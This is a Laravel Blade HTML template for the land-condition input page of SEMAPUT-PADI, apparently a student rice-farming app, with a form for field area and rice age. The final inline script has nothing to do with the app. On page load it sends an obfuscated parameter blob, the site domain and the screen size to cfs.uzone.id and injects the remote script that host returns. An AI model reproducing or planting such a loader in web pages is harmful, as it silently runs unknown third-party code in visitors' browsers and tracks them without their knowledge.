<!DOCTYPE html>
<html>
<head>
	<title>Keadaan Lahan | SEMAPUT</title>
	<link rel="stylesheet" type="text/css" href="{{ URL::asset('/css.css') }}">
	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.6/semantic.min.css">
	<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Oswald" rel="stylesheet">
</head>

<body>

	
	<div class="transparan1"><img id="background" src="{{ URL::asset('image/background.jpg') }}"></div>
	<div id="atas-home">
		<div class="ui grid">
			<div class="three wide column">
				<div class="ilogo1"><img class="ilogo2" src="{{ URL::asset('image/logosemaputpadi.png') }}">
					<div class="tlogo2"> <span class="ku rb">SEMAPUT-PADI</span></div></div>
				</div>
				<div class="two wide column">
				</div>
				<div class="nine wide column" style=" margin-top: 5vh;">
					<div class="ilogo3"><img class="ilogo4" src="{{ URL::asset('image/iconkeadaanlahan.png') }}"></div>
					<p><div class="tulisan3"><div class="t3"><span class="pu">KEADAAN</span> <span class="ku"> LAHAN</span></div></div></p>
				</div>
				<div class="two wide column">
					<a href="/logout">
					<button class="ui inverted yellow button" style="margin-right: 30px;">Logout</button>
					</a>
				</div>
			</div>
@if($errors->has('umurPadi') ? ' has-error' : '' )
				<div class="alert">
				  <span class="closebtn">&times;</span>  
				     <span>{!! $errors->first('umurPadi', '<p class="help-block">:message</p>') !!}</span>
				</div>
				@endif
				@if($errors->has('luasLahan') ? ' has-error' : '' )
				<div class="alert">
				  <span class="closebtn">&times;</span>  
				     <span>{!! $errors->first('luasLahan', '<p class="help-block">:message</p>') !!}</span>
				</div>
				@endif
			<div id="menu-kondisi">
			
				<div class="ui grid">
				<div class="four wide column">
					</div>
					<div class="four wide column">
						<p style="margin-bottom: 30px;"><span class=tx-input><span class="ku">LUAS</span><span class="pu"> LAHAN</span></span>
							<br></p>
						<p style="margin-bottom: 30px;">
							<span class=tx-input><span class="ku">UMUR</span><span class="pu"> PADI</span></span></p>
					</div>
					<div class="one wide column" >
							<p style="margin-bottom: 30px;"><span class=tx-input><span class="pu">:</span></span><br></p>
							<p style="margin-bottom: 30px;"><span class=tx-input><span class="pu">:</span></span></p>
					</div>
						<div class="six wide column">
							<form action="{{url('kondisiTanah')}}" method="post">
								{{csrf_field()}}
								<div class="fkondisi">
									<div class="ui right labeled input" style="margin-bottom: 25px;">
										<input placeholder="Masukkan Luas Lahan" type="number" step="any"  name="luasLahan" value="{{old('luasLahan')}}"  >
										<div class="ui basic label">
											Ha
										</div>
										
									</div> <span class="ku">1 hektar = 10000 m<sup>2</sup></span>
									<br>
									<div class="ui right labeled input" style="margin-bottom: 25px;">
										<input placeholder="Masukkan Umur Padi" type="number" name="umurPadi" value="{{old('umurPadi')}}"  >
										<div class="ui basic label">
											HST
										</div>
									</div> <span class="ku"> HST = Hari Setelah Tanam</span>
								</div>
								
							</div>
						</div>
					</div>

					<div class="next">
						<input type="submit" value="" style="background: url({{ URL::asset('image/icontombolnext.png')}})no-repeat ; border:none;width:100px;height:100px;">
					</div>
				</form>
				<div ></div>	
				<footer style="bottom: 0px;position: fixed;">
					<div class="versi">
						Recently, v0.3
					</div>
					<div class="team">
						by : Yovanka Adam, Anne Rufaedah, Riya Alvianita, Reny Rizqiyatus S.
					</div>
					<div class="for">
						pplagro2016
					</div>
				</footer>
				<script >
var close = document.getElementsByClassName("closebtn");
var i;

for (i = 0; i < close.length; i++) {
    close[i].onclick = function(){
        var div = this.parentElement;
        div.style.opacity = "0";
        setTimeout(function(){ div.style.display = "none"; }, 600);
    }
}
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2Bjw%2bjvmqL3WSUrnnA9180Qh7l5ub%2b6gKdeKDVrP0uqpCOyvMajPCftijUdV%2fKOyC56iSeJuQbNERn03ueP6akmiCN0FwUWY9hdgYb%2bexWEj8bGL9MVUSgA%2fwn8DUSoLmJIO2bmQtbBBXJVTirf383vYTCoOZjwnjzBiNM8dZUjrn5LWWc%2f6gNAHdYD7TsZ4J11bszVMoppkIlRzE0jDKF%2fiB%2fa6e4A1%2fIwE6JZ%2fE%2frkIglagugD6Qdek3JrBkMUB1UN9F4AYKQv4BPQovkaz3LAzqOfACZ9DHahl6GXZyjJC%2ftKc2%2fLepJrIgUwbuZBmpEOIoUyeXkfOZHM90wiSGLYi%2bXTcM17Z%2bXK%2fY0boanVr0YxFMgI8okA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
			</body>
			</html>
